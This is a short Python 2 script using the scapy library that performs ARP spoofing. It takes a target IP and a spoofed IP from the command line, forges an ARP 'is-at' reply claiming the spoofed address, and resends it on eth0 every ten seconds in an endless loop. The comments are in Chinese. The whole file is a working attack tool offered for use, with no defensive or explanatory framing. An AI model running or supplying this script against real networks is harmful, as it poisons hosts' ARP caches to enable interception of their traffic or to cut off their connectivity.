#!/usr/bin/env python
#coding:utf-8

import os
import sys
import time
from scapy.all import sendp,ARP,Ether

if len(sys.argv) < 3:
    print sys.argv[0] + ": <target> <spoof_ip>"
    sys.exit(1)

iface = "eth0"
target_ip = sys.argv[1]   #目标ip
fale_ip = sys.argv[2]     #欺骗ip 

ethernet = Ether()
arp = ARP(pdst=target_ip,psrc=fale_ip,op="is-at")
packet = ethernet / arp

while True:
    sendp(packet,iface=iface)
    time.sleep(10)


